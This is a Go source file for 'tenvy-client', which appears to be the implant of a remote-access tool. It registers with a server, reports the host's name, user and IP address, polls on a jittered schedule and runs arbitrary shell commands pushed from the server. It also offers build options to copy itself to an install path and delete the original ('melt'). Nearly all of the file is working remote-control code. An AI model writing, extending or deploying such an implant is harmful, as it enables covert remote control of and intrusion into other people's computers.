package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

var buildVersion = "dev"

var (
	defaultServerHost           = "localhost"
	defaultServerPort           = "3000"
	defaultInstallPathEncoded   = ""
	defaultEncryptionKeyEncoded = ""
	defaultMeltAfterRun         = "false"
	defaultStartupOnBoot        = "false"
)

const (
	statusOnline  = "online"
	statusOffline = "offline"
)

var ErrUnauthorized = errors.New("unauthorized")

const (
	maxBufferedResults  = 50
	defaultPollInterval = 5 * time.Second
	defaultBackoff      = 30 * time.Second
	defaultShellTimeout = 30 * time.Second
)

type AgentConfig struct {
	PollIntervalMs int     `json:"pollIntervalMs"`
	MaxBackoffMs   int     `json:"maxBackoffMs"`
	JitterRatio    float64 `json:"jitterRatio"`
}

type AgentMetrics struct {
	MemoryBytes   uint64 `json:"memoryBytes,omitempty"`
	Goroutines    int    `json:"goroutines,omitempty"`
	UptimeSeconds uint64 `json:"uptimeSeconds,omitempty"`
}

type Command struct {
	ID        string          `json:"id"`
	Name      string          `json:"name"`
	Payload   json.RawMessage `json:"payload"`
	CreatedAt string          `json:"createdAt"`
}

type CommandResult struct {
	CommandID   string `json:"commandId"`
	Success     bool   `json:"success"`
	Output      string `json:"output,omitempty"`
	Error       string `json:"error,omitempty"`
	CompletedAt string `json:"completedAt"`
}

type AgentMetadata struct {
	Hostname     string   `json:"hostname"`
	Username     string   `json:"username"`
	OS           string   `json:"os"`
	Architecture string   `json:"architecture"`
	IPAddress    string   `json:"ipAddress,omitempty"`
	Tags         []string `json:"tags,omitempty"`
	Version      string   `json:"version,omitempty"`
}

type AgentRegistrationRequest struct {
	Token    string        `json:"token,omitempty"`
	Metadata AgentMetadata `json:"metadata"`
}

type AgentRegistrationResponse struct {
	AgentID    string      `json:"agentId"`
	AgentKey   string      `json:"agentKey"`
	Config     AgentConfig `json:"config"`
	Commands   []Command   `json:"commands"`
	ServerTime string      `json:"serverTime"`
}

type AgentSyncRequest struct {
	Status    string          `json:"status"`
	Timestamp string          `json:"timestamp"`
	Metrics   *AgentMetrics   `json:"metrics,omitempty"`
	Results   []CommandResult `json:"results,omitempty"`
}

type AgentSyncResponse struct {
	AgentID    string      `json:"agentId"`
	Commands   []Command   `json:"commands"`
	Config     AgentConfig `json:"config"`
	ServerTime string      `json:"serverTime"`
}

type PingCommandPayload struct {
	Message string `json:"message,omitempty"`
}

type ShellCommandPayload struct {
	Command        string `json:"command"`
	TimeoutSeconds int    `json:"timeoutSeconds,omitempty"`
}

type Agent struct {
	id             string
	key            string
	baseURL        string
	client         *http.Client
	config         AgentConfig
	logger         *log.Logger
	resultMu       sync.Mutex
	pendingResults []CommandResult
	startTime      time.Time
	metadata       AgentMetadata
	sharedSecret   string
	preferences    BuildPreferences
}

type BuildPreferences struct {
	InstallPath   string
	MeltAfterRun  bool
	StartupOnBoot bool
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	logger := log.New(os.Stdout, "[tenvy-client] ", log.LstdFlags|log.Lmsgprefix)

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	serverURL := strings.TrimRight(getEnv("TENVY_SERVER_URL", defaultServerURL()), "/")
	sharedSecret := fallback(os.Getenv("TENVY_SHARED_SECRET"), decodeBase64(defaultEncryptionKeyEncoded))
	installPathPreference := fallback(os.Getenv("TENVY_INSTALL_PATH"), decodeBase64(defaultInstallPathEncoded))
	preferences := BuildPreferences{
		InstallPath:   installPathPreference,
		MeltAfterRun:  parseBool(defaultMeltAfterRun),
		StartupOnBoot: parseBool(defaultStartupOnBoot),
	}
	metadata := collectMetadata()

	client := &http.Client{Timeout: 60 * time.Second}

	registration, err := registerAgent(ctx, client, serverURL, sharedSecret, metadata)
	if err != nil {
		logger.Fatalf("failed to register agent: %v", err)
	}

	agent := &Agent{
		id:             registration.AgentID,
		key:            registration.AgentKey,
		baseURL:        serverURL,
		client:         client,
		config:         registration.Config,
		logger:         logger,
		pendingResults: make([]CommandResult, 0, 8),
		startTime:      time.Now(),
		metadata:       metadata,
		sharedSecret:   sharedSecret,
		preferences:    preferences,
	}

	agent.applyPreferences()

	logger.Printf("registered as %s", agent.id)
	agent.processCommands(ctx, registration.Commands)

	go agent.run(ctx)

	<-ctx.Done()
	logger.Println("shutting down")

	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer shutdownCancel()
	if err := agent.sync(shutdownCtx, statusOffline); err != nil {
		logger.Printf("failed to send offline heartbeat: %v", err)
	}
}

func (a *Agent) applyPreferences() {
	installPath := strings.TrimSpace(a.preferences.InstallPath)

	if installPath != "" {
		if err := a.ensureInstallation(installPath); err != nil {
			a.logger.Printf("failed to apply installation preference (%s): %v", installPath, err)
		} else {
			a.logger.Printf("persisted agent binary at %s", installPath)
		}
	} else if a.preferences.MeltAfterRun {
		a.logger.Printf("melt preference ignored because no installation path was provided")
	}

	if a.preferences.StartupOnBoot {
		target := installPath
		if target == "" {
			if exe, err := os.Executable(); err == nil {
				target = exe
			}
		}
		if err := configureStartupPreference(target); err != nil {
			a.logger.Printf("startup preference not fully applied: %v", err)
		} else {
			a.logger.Printf("recorded startup preference for %s", target)
		}
	}
}

func (a *Agent) ensureInstallation(target string) error {
	target = strings.TrimSpace(target)
	if target == "" {
		return nil
	}

	executable, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}

	executable, err = filepath.Abs(executable)
	if err != nil {
		return fmt.Errorf("resolve executable path: %w", err)
	}

	destPath := target
	if strings.HasSuffix(target, string(os.PathSeparator)) {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return fmt.Errorf("create install directory: %w", err)
		}
		destPath = filepath.Join(target, filepath.Base(executable))
	} else {
		info, statErr := os.Stat(target)
		if statErr == nil && info.IsDir() {
			destPath = filepath.Join(target, filepath.Base(executable))
		} else if statErr != nil {
			if !os.IsNotExist(statErr) {
				return fmt.Errorf("inspect install path: %w", statErr)
			}
			parent := filepath.Dir(target)
			if err := os.MkdirAll(parent, 0o755); err != nil {
				return fmt.Errorf("prepare install parent: %w", err)
			}
		}
	}

	destPath, err = filepath.Abs(destPath)
	if err != nil {
		return fmt.Errorf("resolve destination path: %w", err)
	}

	if samePath(executable, destPath) {
		return nil
	}

	if err := copyBinary(executable, destPath); err != nil {
		return fmt.Errorf("copy binary: %w", err)
	}

	if a.preferences.MeltAfterRun {
		a.scheduleMelt(executable)
	}

	return nil
}

func (a *Agent) scheduleMelt(path string) {
	go func() {
		time.Sleep(3 * time.Second)
		if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
			a.logger.Printf("failed to remove staging binary: %v", err)
		}
	}()
}

func (a *Agent) run(ctx context.Context) {
	pollInterval := a.pollInterval()
	backoff := pollInterval

	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(a.withJitter(pollInterval)):
		}

		if err := a.sync(ctx, statusOnline); err != nil {
			if errors.Is(err, ErrUnauthorized) {
				a.logger.Printf("sync unauthorized: %v", err)
				if err := a.reRegister(ctx); err != nil {
					if ctx.Err() != nil {
						return
					}
					a.logger.Printf("re-registration failed: %v", err)
				} else {
					pollInterval = a.pollInterval()
					backoff = pollInterval
					continue
				}
			} else {
				a.logger.Printf("sync error: %v", err)
			}
			backoff = minDuration(backoff*2, a.maxBackoff())
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			continue
		}

		pollInterval = a.pollInterval()
		backoff = pollInterval
	}
}

func (a *Agent) sync(ctx context.Context, status string) error {
	results := a.consumeResults()
	payload, err := a.performSync(ctx, status, results)
	if err != nil {
		if len(results) > 0 && !errors.Is(err, ErrUnauthorized) {
			a.enqueueResults(results)
		}
		return err
	}

	a.config = payload.Config
	a.processCommands(ctx, payload.Commands)
	return nil
}

func (a *Agent) performSync(ctx context.Context, status string, results []CommandResult) (*AgentSyncResponse, error) {
	reqBody := AgentSyncRequest{
		Status:    status,
		Timestamp: time.Now().UTC().Format(time.RFC3339Nano),
		Metrics:   a.collectMetrics(),
	}
	if len(results) > 0 {
		reqBody.Results = results
	}

	data, err := json.Marshal(reqBody)
	if err != nil {
		return nil, err
	}

	endpoint := fmt.Sprintf("%s/api/agents/%s/sync", a.baseURL, url.PathEscape(a.id))
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", userAgent())
	if strings.TrimSpace(a.key) != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.key))
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		message := strings.TrimSpace(string(body))
		if resp.StatusCode == http.StatusUnauthorized {
			if message == "" {
				return nil, ErrUnauthorized
			}
			return nil, fmt.Errorf("%w: %s", ErrUnauthorized, message)
		}
		if message == "" {
			message = fmt.Sprintf("status %d", resp.StatusCode)
		}
		return nil, fmt.Errorf("sync failed: %s", message)
	}

	var payload AgentSyncResponse
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, err
	}

	return &payload, nil
}

func (a *Agent) reRegister(ctx context.Context) error {
	if ctx.Err() != nil {
		return ctx.Err()
	}

	metadata := collectMetadata()
	registration, err := registerAgent(ctx, a.client, a.baseURL, a.sharedSecret, metadata)
	if err != nil {
		return err
	}

	a.metadata = metadata
	a.id = registration.AgentID
	a.key = registration.AgentKey
	a.config = registration.Config
	a.startTime = time.Now()
	a.resultMu.Lock()
	a.pendingResults = a.pendingResults[:0]
	a.resultMu.Unlock()

	a.logger.Printf("re-registered as %s", a.id)
	a.processCommands(ctx, registration.Commands)
	return nil
}

func (a *Agent) processCommands(ctx context.Context, commands []Command) {
	for _, cmd := range commands {
		if ctx.Err() != nil {
			a.enqueueResult(CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       "agent shutting down",
				CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
			})
			continue
		}

		a.logger.Printf("executing command %s (%s)", cmd.ID, cmd.Name)
		result := a.executeCommand(ctx, cmd)
		a.enqueueResult(result)
	}
}

func (a *Agent) executeCommand(ctx context.Context, cmd Command) CommandResult {
	switch cmd.Name {
	case "ping":
		return handlePingCommand(cmd)
	case "shell":
		return handleShellCommand(ctx, cmd)
	default:
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("unsupported command: %s", cmd.Name),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}
}

func handlePingCommand(cmd Command) CommandResult {
	var payload PingCommandPayload
	_ = json.Unmarshal(cmd.Payload, &payload)
	response := "pong"
	if strings.TrimSpace(payload.Message) != "" {
		response = payload.Message
	}
	return CommandResult{
		CommandID:   cmd.ID,
		Success:     true,
		Output:      response,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
}

func handleShellCommand(ctx context.Context, cmd Command) CommandResult {
	var payload ShellCommandPayload
	if err := json.Unmarshal(cmd.Payload, &payload); err != nil {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       fmt.Sprintf("invalid shell payload: %v", err),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	if strings.TrimSpace(payload.Command) == "" {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "missing command",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	timeout := defaultShellTimeout
	if payload.TimeoutSeconds > 0 {
		timeout = time.Duration(payload.TimeoutSeconds) * time.Second
	}

	commandCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	output, err := runShell(commandCtx, payload.Command)
	result := CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}

	if err != nil {
		result.Success = false
		result.Error = err.Error()
		result.Output = string(output)
	} else {
		result.Success = true
		result.Output = string(output)
	}
	return result
}

func runShell(ctx context.Context, command string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return exec.CommandContext(ctx, "cmd", "/C", command).CombinedOutput()
	}

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/sh"
	}
	return exec.CommandContext(ctx, shell, "-c", command).CombinedOutput()
}

func (a *Agent) enqueueResult(result CommandResult) {
	a.resultMu.Lock()
	defer a.resultMu.Unlock()
	a.pendingResults = append(a.pendingResults, result)
	if len(a.pendingResults) > maxBufferedResults {
		a.pendingResults = append([]CommandResult(nil), a.pendingResults[len(a.pendingResults)-maxBufferedResults:]...)
	}
}

func (a *Agent) enqueueResults(results []CommandResult) {
	for _, result := range results {
		a.enqueueResult(result)
	}
}

func (a *Agent) consumeResults() []CommandResult {
	a.resultMu.Lock()
	defer a.resultMu.Unlock()
	if len(a.pendingResults) == 0 {
		return nil
	}
	results := make([]CommandResult, len(a.pendingResults))
	copy(results, a.pendingResults)
	a.pendingResults = a.pendingResults[:0]
	return results
}

func (a *Agent) collectMetrics() *AgentMetrics {
	var stats runtime.MemStats
	runtime.ReadMemStats(&stats)
	return &AgentMetrics{
		MemoryBytes:   stats.Alloc,
		Goroutines:    runtime.NumGoroutine(),
		UptimeSeconds: uint64(time.Since(a.startTime).Seconds()),
	}
}

func (a *Agent) pollInterval() time.Duration {
	if a.config.PollIntervalMs <= 0 {
		return defaultPollInterval
	}
	return time.Duration(a.config.PollIntervalMs) * time.Millisecond
}

func (a *Agent) maxBackoff() time.Duration {
	if a.config.MaxBackoffMs <= 0 {
		return defaultBackoff
	}
	return time.Duration(a.config.MaxBackoffMs) * time.Millisecond
}

func (a *Agent) withJitter(base time.Duration) time.Duration {
	ratio := a.config.JitterRatio
	if ratio <= 0 {
		return base
	}
	jitter := (rand.Float64()*2 - 1) * ratio * float64(base)
	value := time.Duration(float64(base) + jitter)
	if value <= 0 {
		return base
	}
	return value
}

func registerAgent(ctx context.Context, client *http.Client, serverURL, token string, metadata AgentMetadata) (*AgentRegistrationResponse, error) {
	request := AgentRegistrationRequest{Metadata: metadata}
	if strings.TrimSpace(token) != "" {
		request.Token = token
	}

	data, err := json.Marshal(request)
	if err != nil {
		return nil, err
	}

	endpoint := fmt.Sprintf("%s/api/agents/register", serverURL)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("User-Agent", userAgent())

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		if len(body) == 0 {
			return nil, fmt.Errorf("registration failed with status %d", resp.StatusCode)
		}
		return nil, fmt.Errorf("registration failed: %s", strings.TrimSpace(string(body)))
	}

	var payload AgentRegistrationResponse
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, err
	}

	if strings.TrimSpace(payload.AgentID) == "" {
		return nil, errors.New("missing agent identifier in response")
	}
	if strings.TrimSpace(payload.AgentKey) == "" {
		return nil, errors.New("missing agent key in response")
	}

	return &payload, nil
}

func collectMetadata() AgentMetadata {
	hostname, _ := os.Hostname()
	currentUser, err := user.Current()
	username := "unknown"
	if err == nil {
		username = currentUser.Username
	} else if val := os.Getenv("USER"); val != "" {
		username = val
	} else if val := os.Getenv("USERNAME"); val != "" {
		username = val
	}

	tags := parseTags(os.Getenv("TENVY_AGENT_TAGS"))

	return AgentMetadata{
		Hostname:     fallback(hostname, "unknown"),
		Username:     username,
		OS:           runtime.GOOS,
		Architecture: runtime.GOARCH,
		IPAddress:    detectPrimaryIP(),
		Tags:         tags,
		Version:      buildVersion,
	}
}

func defaultServerURL() string {
	host := strings.TrimSpace(defaultServerHost)
	port := strings.TrimSpace(defaultServerPort)

	if host == "" {
		host = "localhost"
	}

	if strings.Contains(host, "://") {
		return strings.TrimRight(host, "/")
	}

	if port == "" {
		port = "3000"
	}

	scheme := "http"
	if port == "443" {
		scheme = "https"
	}

	return fmt.Sprintf("%s://%s:%s", scheme, host, port)
}

func decodeBase64(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func parseBool(value string) bool {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "1", "true", "yes", "on", "enabled":
		return true
	default:
		return false
	}
}

func samePath(a, b string) bool {
	aClean := filepath.Clean(a)
	bClean := filepath.Clean(b)
	if runtime.GOOS == "windows" {
		return strings.EqualFold(aClean, bClean)
	}
	return aClean == bClean
}

func copyBinary(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	tmpPath := dst + ".tmp"
	out, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o755)
	if err != nil {
		return err
	}

	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		os.Remove(tmpPath)
		return err
	}

	if err := out.Close(); err != nil {
		os.Remove(tmpPath)
		return err
	}

	if err := os.Rename(tmpPath, dst); err != nil {
		os.Remove(tmpPath)
		return err
	}

	return nil
}

func configureStartupPreference(target string) error {
	target = strings.TrimSpace(target)
	if target == "" {
		return errors.New("no target provided for startup preference")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("resolve home directory: %w", err)
	}

	var configDir string
	if runtime.GOOS == "windows" {
		configDir = filepath.Join(homeDir, "AppData", "Roaming", "Tenvy")
	} else {
		configDir = filepath.Join(homeDir, ".config", "tenvy")
	}

	if err := os.MkdirAll(configDir, 0o755); err != nil {
		return fmt.Errorf("create startup config directory: %w", err)
	}

	entryPath := filepath.Join(configDir, "startup-target.txt")
	if err := os.WriteFile(entryPath, []byte(target+"\n"), 0o644); err != nil {
		return fmt.Errorf("persist startup preference: %w", err)
	}

	return nil
}

func detectPrimaryIP() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range interfaces {
		if (iface.Flags&net.FlagUp) == 0 || (iface.Flags&net.FlagLoopback) != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ip := extractIP(addr)
			if ip == "" {
				continue
			}
			return ip
		}
	}
	return ""
}

func extractIP(addr net.Addr) string {
	switch v := addr.(type) {
	case *net.IPNet:
		if v.IP.IsLoopback() {
			return ""
		}
		ip := v.IP.To4()
		if ip != nil {
			return ip.String()
		}
		if v.IP.To16() != nil {
			return v.IP.String()
		}
	case *net.IPAddr:
		if v.IP.IsLoopback() {
			return ""
		}
		ip := v.IP.To4()
		if ip != nil {
			return ip.String()
		}
		if v.IP.To16() != nil {
			return v.IP.String()
		}
	}
	return ""
}

func parseTags(value string) []string {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	parts := strings.Split(value, ",")
	tags := make([]string, 0, len(parts))
	for _, part := range parts {
		trimmed := strings.TrimSpace(part)
		if trimmed != "" {
			tags = append(tags, trimmed)
		}
	}
	if len(tags) == 0 {
		return nil
	}
	return tags
}

func fallback(value, fallbackValue string) string {
	if strings.TrimSpace(value) == "" {
		return fallbackValue
	}
	return value
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

func getEnv(key, fallback string) string {
	if value := strings.TrimSpace(os.Getenv(key)); value != "" {
		return value
	}
	return fallback
}

func userAgent() string {
	return fmt.Sprintf("tenvy-client/%s", buildVersion)
}
